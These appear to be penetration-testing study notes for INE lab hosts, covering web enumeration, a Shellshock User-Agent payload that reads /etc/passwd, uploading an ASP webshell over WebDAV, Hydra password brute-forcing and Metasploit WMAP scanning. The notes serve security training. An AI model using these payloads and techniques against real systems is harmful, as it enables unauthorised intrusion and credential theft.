

```
nmap --script http-enum -sV -p 80 $TG
```


## ShellShock

```
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

Injecting through `User-Agent` Header:
```
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```


## WevDAV

```
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```


The .asp backdoor present in `/usr/share/webshells/asp/` directory. i.e `/usr/share/webshells/asp/webshell.asp`.

```
cadaver http://demo.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
ls
```

Using dirb to do local directory enumeration on Web root.
```
dirb http://demo.ine.local
```

Sending GET request:
```
curl -X GET demo.ine.local
```

Sending HEAD request:
```
curl -I demo.ine.local
```


Sending OPTIONS request:
```
curl -X OPTIONS demo.ine.local -v
```

Sending POST Request:
```
curl -X POST demo.ine.local
curl -X POST demo.ine.local/login.php -d "name=john&password=password" -v
```

Sending PUT Request:
```
curl -XPUT demo.ine.local
```

Uploading a file:
```
curl demo.ine.local/uploads/ --upload-file hello.txt
```

Deleting a file:
```
curl -XDELETE demo.ine.local/uploads/hello.txt
```





Wordlists

| Wordlist                                                     | Line count |
| ------------------------------------------------------------ | ---------- |
| `/usr/share/wordlists/dirb/common.txt`                       | 4614       | 
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`  | 17         | 
| `/root/Desktop/wordlists/100-common-passwords.txt`           | 100        | 


###### Bruteforcing with Hydra

**HTTP Forms**
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -t 10
```

**HTTP Basic Auth**
```
hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $TG http-get /
```





## Web App Vulnerability Scanning with WMAP

WMAP is a metasploit module that helps to identify misconfigurations and vulnerabilities on the web server that can be exploited. Run `msfconsole` to get started.

To load `WMAP` and add targets:
```
load wmap
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3
```

To list out sites and targets:
```
wmap_sites -l
wmap_targets -l
```

The below command will begin testing the target and then displays a list of available modules that can be run against the target web server:
```
wmap_run -t
```

Perform a web app vulnerability scan on the target by running the following command:
```
wmap_run -e
```






